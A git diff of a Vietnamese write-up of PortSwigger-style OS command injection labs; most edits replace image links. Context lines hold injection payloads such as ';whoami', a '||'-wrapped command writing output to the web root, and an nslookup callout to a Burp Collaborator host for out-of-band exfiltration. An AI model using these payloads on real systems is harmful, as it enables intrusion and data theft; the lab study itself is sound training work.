@@ -7,18 +7,21 @@
 
 > OS command injection là lỗ hổng giúp ta thực thi được câu lệnh bên trong web nguy hiểm nó có thể tương tác với kernel của hệ điều hành
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/eb45c925-299f-4b69-831b-8b86bb92acdd)
+![347152750-eb45c925-299f-4b69-831b-8b86bb92acdd](https://github.com/user-attachments/assets/63a2bb20-64da-4acd-a616-7d59a2047f49)
+
 
 
 + step 1 : Recon
 
   - với bài này này sau khi check ta thấy có chức năng "check stock" có sử dụng có 1 list mà nghĩ có thể đó là định dạng json nên ta sẽ check
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/27457b86-1b12-4ea8-8ab0-9ea84855225a)
+![347153234-27457b86-1b12-4ea8-8ab0-9ea84855225a](https://github.com/user-attachments/assets/d63ac8c0-9e42-4429-9df6-1a643c26b84a)
+
 
   - sử dụng brupsuite để phân tích chức năng đó
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/aef4e0a1-6e2e-45bf-83f2-f3f17b485b39)
+![347153450-aef4e0a1-6e2e-45bf-83f2-f3f17b485b39](https://github.com/user-attachments/assets/a8b355b3-1e23-4927-b0fa-e5b0a489b1ea)
+
 
 => nó đang có 2 parameter ở body vì là lỗ hổng OS command injection nên ta sẽ khai thác thông tin này bằng cách check quote ;ls vào productid và storeid 
 
@@ -30,7 +33,8 @@
       storeid=?;whoami or |whoami 
     ```
 
-![image](https://github.com/j10nelop/Pr1vate/assets/152776722/71de2e61-b215-4d38-b150-d9957d29a136)
+![347327930-71de2e61-b215-4d38-b150-d9957d29a136](https://github.com/user-attachments/assets/5d22c798-0bb1-4f7e-927d-b3fcff39b650)
+
 
 + trong product id tượng trưng cho primary key không đổi của database server nên không chèn được còn store id là value thì chèn được
 
@@ -55,7 +59,7 @@
 
 > To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 
 
-![image](https://github.com/user-attachments/assets/69e7540e-9f07-47ba-8303-46bfc0039b0d)
+![348474218-69e7540e-9f07-47ba-8303-46bfc0039b0d](https://github.com/user-attachments/assets/5d9d4b12-8ef9-4dfd-8d81-9a8c69af303a)
 
 + step 1 : Recon
 
@@ -77,9 +81,9 @@
 
 - & là sử dụng trong khi thỏa mãn cả 2 trường hợp
 
-- # comment chức năng đằng sau
+- comment chức năng đằng sau
 
-![image](https://github.com/user-attachments/assets/e93f306b-edc9-4536-bc12-c8fcb2d446e2)
+![348474937-e93f306b-edc9-4536-bc12-c8fcb2d446e2](https://github.com/user-attachments/assets/31be9d12-0c20-4945-9682-b46e0ea19237)
 
 => solve lab 2
 
@@ -92,7 +96,7 @@
 
 > To solve the lab, execute the whoami command and retrieve the output. 
 
-![image](https://github.com/user-attachments/assets/2a8986de-1bdc-4b2c-850c-0f706948a2fa)
+![348477030-2a8986de-1bdc-4b2c-850c-0f706948a2fa](https://github.com/user-attachments/assets/50f56f4e-253f-4d8a-99ee-94eda630d8a8)
 
 
 + step 1: Recon
@@ -113,7 +117,7 @@
 
         email = x || ping 127.0.0.1 > /var/www/images/output.txt ||
 
-![image](https://github.com/user-attachments/assets/6d508a4b-1387-4ffd-9252-5ff92993f140)
+![348477271-6d508a4b-1387-4ffd-9252-5ff92993f140](https://github.com/user-attachments/assets/4b8cdfe9-2c75-4c36-878d-f884ef6a361e)
 
 => sau khi ghi command lưu vào root directory thì ta sẽ chạy filename=<file> để hiển thị output
 
@@ -128,7 +132,7 @@
 
 > To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 
 
-![image](https://github.com/user-attachments/assets/e63205d0-2490-4f34-b8cb-d13c2ee727f6)
+![348520749-e63205d0-2490-4f34-b8cb-d13c2ee727f6](https://github.com/user-attachments/assets/c0626b27-0a42-4c4c-b199-1fb745ca86e0)
 
 
 + step 1: Recon
@@ -147,8 +151,7 @@
         & nslookup me4bngatc9k527z04pnqpdq51w7nvej3.oastify.com #
     ```
 
-![image](https://github.com/user-attachments/assets/80f57973-c6d6-4866-afdd-c4f0cb80e439)
-
+![348520829-80f57973-c6d6-4866-afdd-c4f0cb80e439](https://github.com/user-attachments/assets/052609e0-25ae-4480-be5f-1f600758a6c3)
 
 => ta có thể thấy nó poll được DNS với giá trị IP 
 
@@ -162,7 +165,7 @@
 
 > To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 
 
-![image](https://github.com/user-attachments/assets/d5d77424-0e38-49bc-b616-c6430a9faeb4)
+![348521202-d5d77424-0e38-49bc-b616-c6430a9faeb4](https://github.com/user-attachments/assets/d04c1858-6dc6-4637-a9ca-d31d0b232b5e)
 
 
 + step 1: Recon
@@ -189,6 +192,6 @@
 
 => ta sẽ truyền vào command vào domain brup để khi trả về dns đồng thời sẽ trả về output của câu lệnh 
 
-![image](https://github.com/user-attachments/assets/733a7f70-59e1-42b2-8c76-372355f481ec)
+![348521316-733a7f70-59e1-42b2-8c76-372355f481ec](https://github.com/user-attachments/assets/d3a52ee8-f81d-4215-b166-de9c669506df)
 
 => solve lab 5
